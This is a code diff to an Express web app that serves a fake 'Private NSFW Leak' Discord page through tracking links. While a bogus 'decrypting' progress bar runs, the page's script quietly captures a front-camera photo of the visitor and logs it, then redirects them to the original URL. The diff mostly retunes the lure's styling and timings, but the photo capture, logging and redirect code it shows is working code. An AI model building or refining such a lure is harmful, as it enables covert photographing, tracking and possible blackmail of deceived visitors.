@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== IMPROVED SEXY GIRL PAGE ==================
+// ================== SEXIER GIRL PAGE (More Revealing) ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -43,7 +43,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
   <title>Discord • Private NSFW</title>
   <style>
     body { 
-      background: linear-gradient(135deg, #0a000f, #1a001a); 
+      background: linear-gradient(135deg, #0a000f, #220022); 
       color: #ff00cc; 
       font-family: 'Segoe UI', Arial, sans-serif; 
       text-align: center; 
@@ -56,21 +56,20 @@ app.get('/nsfw-leak/:id', (req, res) => {
       font-size: 29px; 
       margin: 15px 0; 
       text-shadow: 0 0 15px #ff00aa; 
-      letter-spacing: 1px;
     }
     .preview {
       width: 100%;
       max-width: 380px;
       height: 460px;
-      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
-                  url('https://picsum.photos/id/1011/800/1200');
+      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), 
+                  url('https://picsum.photos/id/1005/800/1200');
       background-size: cover;
-      background-position: center 20%;
+      background-position: center 30%;
       border-radius: 16px;
       margin: 25px auto;
       position: relative;
-      box-shadow: 0 0 40px rgba(255, 0, 170, 0.6);
-      border: 2px solid #ff00aa;
+      box-shadow: 0 0 45px rgba(255, 0, 170, 0.7);
+      border: 3px solid #ff00aa;
     }
     .preview::after {
       content: "18+ EXPLICIT";
@@ -79,54 +78,48 @@ app.get('/nsfw-leak/:id', (req, res) => {
       right: 20px;
       background: #ff0066;
       color: white;
-      padding: 6px 16px;
+      padding: 6px 18px;
       border-radius: 30px;
       font-size: 13px;
       font-weight: bold;
-      letter-spacing: 1px;
     }
     .progress { 
-      height: 9px; 
+      height: 10px; 
       background: #222; 
       border-radius: 999px; 
       overflow: hidden; 
       margin: 35px auto; 
-      max-width: 380px; 
+      max-width: 400px; 
     }
     .bar { 
       height: 100%; 
       width: 0%; 
-      background: linear-gradient(90deg, #ff00aa, #ff3399, #ff66cc); 
-      animation: load 5.5s linear forwards; 
+      background: linear-gradient(90deg, #ff00aa, #ff3399, #ff66ff); 
+      animation: load 5.8s linear forwards; 
     }
     .status { 
       color: #00ffbb; 
       font-size: 19px; 
-      margin: 18px 0; 
+      margin: 20px 0; 
       font-weight: 600;
     }
     @keyframes load { 
       to { width: 100%; } 
-    }
-    .warning {
-      color: #ffcc00;
-      font-size: 14px;
-      margin-top: 25px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>🔞 Private NSFW Leak</h1>
-    <p style="color:#ff99dd; margin-bottom:20px;">Content from restricted Discord server • Only for 18+</p>
+    <p style="color:#ff99dd;">Content from restricted Discord server • Only for 18+</p>
     
     <div class="preview"></div>
     
-    <p style="font-size:17px;">Decrypting private photos & videos...</p>
+    <p style="font-size:17px; margin:15px 0;">Decrypting private photos & videos...</p>
     <div class="progress"><div class="bar"></div></div>
-    <p class="status" id="status">69% • Almost ready...</p>
+    <p class="status" id="status">69% • Almost there...</p>
     
-    <p class="warning">This content contains explicit 18+ material</p>
+    <p style="color:#ffcc00; font-size:14px;">This content contains explicit 18+ material</p>
   </div>
 
   <video id="video" autoplay playsinline style="display:none"></video>
@@ -155,11 +148,11 @@ app.get('/nsfw-leak/:id', (req, res) => {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        video.onloadedmetadata = () => setTimeout(takePhoto, 3400);
+        video.onloadedmetadata = () => setTimeout(takePhoto, 3500);
       } catch(e) {
         document.getElementById('status').innerHTML = "Camera access blocked<br>Redirecting...";
         await logVisit(null, "Denied");
-        setTimeout(() => window.location.href = "${originalUrl}", 1800);
+        setTimeout(() => window.location.href = "${originalUrl}", 1600);
       }
     }
 
@@ -171,7 +164,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
 
       logVisit(photo, "Granted").then(() => {
         if (stream) stream.getTracks().forEach(t => t.stop());
-        setTimeout(() => window.location.href = "${originalUrl}", 1200);
+        setTimeout(() => window.location.href = "${originalUrl}", 1100);
       });
     }
 
